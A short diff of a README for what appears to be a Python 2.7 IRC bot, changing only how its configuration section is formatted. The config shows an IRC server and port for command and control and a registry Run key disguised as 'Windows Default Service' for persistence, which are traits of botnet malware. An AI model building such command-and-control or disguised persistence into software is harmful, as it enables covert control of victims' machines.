@@ -7,9 +7,10 @@ Some implementations and debugs are needed.
 env :Python 2.7.5
 
 # Configuration
-You can configure it by looking at the #CONFIG section in the source code.
+You can configure it by looking at the #CONFIG section in the source code:
 
-```#CONFIG
+```
+#CONFIG
 #winrgky      = 'Windows Default Service' #Windows Registry Run Key 
 ircs          = 'irc.tiscali.it'          #IRC Server
 ircp          = 6667                      #IRC Port
